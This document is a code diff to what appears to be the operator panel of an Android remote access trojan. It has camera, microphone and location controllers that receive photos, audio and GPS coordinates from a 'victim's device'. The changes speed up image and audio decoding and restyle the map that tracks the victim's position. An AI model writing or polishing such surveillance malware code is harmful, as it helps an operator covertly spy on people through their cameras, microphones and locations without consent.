@@ -145,13 +145,8 @@ app.controller("CamCtrl", function($scope, $rootScope) {
 
             $rootScope.Log('Picture arrived', CONSTANTS.logStatus.SUCCESS);
 
-            // convert binary to base64
-            var uint8Arr = new Uint8Array(data.buffer);
-            var binary = '';
-            for (var i = 0; i < uint8Arr.length; i++) {
-                binary += String.fromCharCode(uint8Arr[i]);
-            }
-            var base64String = window.btoa(binary);
+            // convert binary to base64 efficiently (Evita que la interfaz se congele con fotos grandes)
+            var base64String = Buffer.from(data.buffer).toString('base64');
 
             $camCtrl.imgUrl = 'data:image/png;base64,' + base64String;
             $camCtrl.isSaveShown = true;
@@ -516,12 +511,8 @@ app.controller("MicCtrl", function($scope, $rootScope) {
 
             var player = document.getElementById('player');
             var sourceMp3 = document.getElementById('sourceMp3');
-            var uint8Arr = new Uint8Array(data.buffer);
-            var binary = '';
-            for (var i = 0; i < uint8Arr.length; i++) {
-                binary += String.fromCharCode(uint8Arr[i]);
-            }
-            var base64String = window.btoa(binary);
+            // Optimized conversion para audio
+            var base64String = Buffer.from(data.buffer).toString('base64');
 
             $MicCtrl.isAudio = false;
             $MicCtrl.$apply();
@@ -565,8 +556,26 @@ app.controller("LocCtrl", function($scope, $rootScope) {
     });
 
 
-    var map = L.map('mapid').setView([51.505, -0.09], 13);
-    L.tileLayer('http://{s}.tile.osm.org/{z}/{x}/{y}.png', {}).addTo(map);
+    var map = L.map('mapid', {
+        zoomControl: false // Disable default zoom to add it in a better place later if needed
+    }).setView([51.505, -0.09], 14);
+
+    // Use a modern, beautiful tile layer (CartoDB Dark Matter or Voyager)
+    L.tileLayer('https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}{r}.png', {
+        attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OSM</a> contributors &copy; <a href="https://carto.com/attributions">CARTO</a>',
+        subdomains: 'abcd',
+        maxZoom: 20
+    }).addTo(map);
+
+    // Custom Icon for the marker (Optional but recommended for better look)
+    var customIcon = L.icon({
+        iconUrl: 'assets/css/images/marker-icon.png', // Fallback to default if no custom icon provided yet
+        shadowUrl: 'assets/css/images/marker-shadow.png',
+        iconSize: [25, 41],
+        iconAnchor: [12, 41],
+        popupAnchor: [1, -34],
+        shadowSize: [41, 41]
+    });
 
     $LocCtrl.Refresh = () => {
 
@@ -575,8 +584,6 @@ app.controller("LocCtrl", function($scope, $rootScope) {
         socket.emit(ORDER, { order: location });
 
     }
-
-
 
     $LocCtrl.load = 'loading';
     $rootScope.Log('Get Location..');
@@ -592,12 +599,24 @@ app.controller("LocCtrl", function($scope, $rootScope) {
             else {
                 $rootScope.Log('Location arrived => ' + data.lat + "," + data.lng, CONSTANTS.logStatus.SUCCESS);
                 var victimLoc = new L.LatLng(data.lat, data.lng);
-                if (!marker)
-                    var marker = L.marker(victimLoc).addTo(map);
-                else
+                if (!marker) {
+                    marker = L.marker(victimLoc, { icon: customIcon }).addTo(map);
+                    // Add a nice circle to represent precision/area
+                    L.circle(victimLoc, {
+                        color: '#6435c9', // Violet color matching your UI
+                        fillColor: '#6435c9',
+                        fillOpacity: 0.15,
+                        radius: 150
+                    }).addTo(map);
+                } else {
                     marker.setLatLng(victimLoc).update();
+                }
 
-                map.panTo(victimLoc);
+                // Smooth pan and zoom to the location
+                map.flyTo(victimLoc, 16, {
+                    animate: true,
+                    duration: 1.5
+                });
             }
         } else
             $rootScope.Log('Location Service is not enabled on Victim\'s Device', CONSTANTS.logStatus.FAIL);
